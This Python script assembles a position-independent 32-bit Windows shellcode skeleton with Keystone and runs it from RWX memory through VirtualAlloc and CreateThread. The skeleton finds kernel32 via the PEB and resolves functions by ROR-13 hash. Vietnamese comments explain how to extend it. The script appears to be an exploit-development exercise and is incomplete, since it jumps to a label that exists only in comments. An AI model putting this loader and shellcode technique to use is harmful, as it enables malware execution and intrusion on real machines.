from keystone import *
import sys
import ctypes, struct

def asm2shell(c):
    print("Generate shellcode ...")
    # Initialize engine in 32-bit mode
    ks = Ks(KS_ARCH_X86, KS_MODE_32)
    encoding, count = ks.asm(c)
    sh = b""
    instructions = ""
    for e in encoding: 
        sh += struct.pack("B",e)
        instructions += "\\x{0:02x}".format(int(e)).rstrip("\n") 
    print("Shellcode size: %d bytes"%(count))
    shellcode = bytearray(sh)
    print("Shellcode: %s"%instructions)
    ptr = ctypes.windll.kernel32.VirtualAlloc(ctypes.c_int(0), ctypes.c_int(len(shellcode)), ctypes.c_int(0x3000), ctypes.c_int(0x40))
    buf = (ctypes.c_char * len(shellcode)).from_buffer(shellcode)
    ctypes.windll.kernel32.RtlMoveMemory(ctypes.c_int(ptr), buf, ctypes.c_int(len(shellcode)))

    print("Shellcode located at address %s" % hex(ptr))
    input("...ENTER TO EXECUTE SHELLCODE...")

    ht = ctypes.windll.kernel32.CreateThread(ctypes.c_int(0), ctypes.c_int(0), ctypes.c_int(ptr), ctypes.c_int(0), ctypes.c_int(0), ctypes.pointer(ctypes.c_int(0)))
    ctypes.windll.kernel32.WaitForSingleObject(ctypes.c_int(ht), ctypes.c_int(-1))


code = "start:"
# Setup stack
code += "mov ebp, esp;"
code += "add esp, 0xfffff9f0 ;"
# Find_kernel32
code += "find_kernel32: "
code += "xor ecx, ecx;"
code += "mov esi, fs:[ecx + 0x30];" # PEB
code += "mov esi, [esi + 0x0c];" # PEB -> Ldr
code += "mov esi, [esi + 0x1c];" #PEB -> Ldr.InInitOrder
code += "next_module: "
code += "mov ebx, [esi + 0x8];" # InInitOrder[i].base_address
code += "mov edi, [esi + 0x20];" # InInitOrder[X].module_name
code += "mov esi, [esi];" # InInitOrder[X].flink
code += "cmp [edi + 12*2], cx;" # if module_name[12] == 0
code += "jne next_module;"

# find_function_shorten
code += "find_function_shorten:"
code += "jmp find_function_shorten_bnc;"
code += "find_function_ret:"
code += "pop esi;" # save ret address to esi
code += "mov [ebp + 0x4], esi;" # save ret address
code += "jmp resolve_symbols_kernel32;"
code += "find_function_shorten_bnc:"
code += "call find_function_ret;"

# find function
code += "find_function:"
code += "pushad;"
code += "mov eax, [ebx + 0x3c];" # PE Signature
code += "mov edi, [ebx + eax + 0x78];" # Directory RVA
code += "add edi, ebx;" # Directory VMA
code += "mov ecx, [edi + 0x18];" # NumberOfNames
code += "mov eax, [edi + 0x20];" # AddressOfNames RVA
code += "add eax, ebx;" # AddressOfNames VMA
code += "mov [ebp-4], eax;" # save AddressOfNames VMA
code += "find_function_loop:"
code += "jecxz find_function_finished;"
code += "add ecx, 0xffffffff;"
code += "mov eax, [ebp-4];"
code += "mov esi, [eax + ecx*4];" # Get the RVA of the symbol name
code += "add esi, ebx;"

# compute hash
code += "compute_hash:"
code += "xor eax, eax;" # clear eax
code += "cdq;" # clear edx
code += "cld;" # clear direaction? 
code += "compute_hash_again:"
code += "lodsb;" # load next byte from esi to al
code += "test al, al;"
code += "jz compute_hash_finished;"
code += "ror edx, 0x0d;"
code += "add edx, eax;"
code += "jmp compute_hash_again;"
code += "compute_hash_finished:"
code += "cmp edx, [esp + 0x24];"
code += "jnz find_function_loop;"
code += "mov edx, [edi + 0x24];"
code += "add edx, ebx;"
code += "mov cx, [edx + 2 * ecx];" 
code += "mov edx, [edi + 0x1c];"
code += "add edx, ebx;"
code += "mov eax, [edx + 4 * ecx];"
code += "add eax, ebx;"
code += "mov [esp + 0x1c], eax;"
code += "find_function_finished:"
code += "popad;"
code += "ret;"

#   resolve kernel32 symbol
#   Thực hiện tìm địa chỉ của hàm và thực hiện lưu vào [ebp + x] (X bắt đầu từ 0x10 và tăng 0x4 cho mỗi lần lưu hàm)
#   Nếu hàm không có trong kernel32.dll cần phải tìm hàm loadlibraryA từ kernel32 sau đó load dll cần thiết, sau khi gọi loadlibraryA lưu địa chỉ từ eax vào ebx để thay đổi addressbase từ kernel32 sang dll mới được load
#   Lưu ý: Thực hiện lưu hết các hàm cần thiết trong kernel32 trước khi load dll khác
#  Ví dụ: Tìm và lưu hàm TerminateProcess từ kernel32

#   code += "resolve_symbols_kernel32:"
#   code += "push 0x78b5b983;" # TerminateProcess
#   code += "call dword ptr [ebp + 0x4];" # call find_function
#   code += "mov [ebp + 0x10], eax;" # save TerminateProcess 

# Tham số của hàm sẽ được push lên stack theo thứ tự từ dưới lên trên (Tham số cuối cùng sẽ được push đầu tiên)
# Ví dụ: TerminateProcess(0xFFFFFFFF, 0x12345678)

#   code += "push 0x12345678;"  # uExitCode
#   code += "push 0xffffffff;"  # hProcess
#   code += "call dword ptr [ebp + 0x10];" # call TerminateProcess


asm2shell(code)
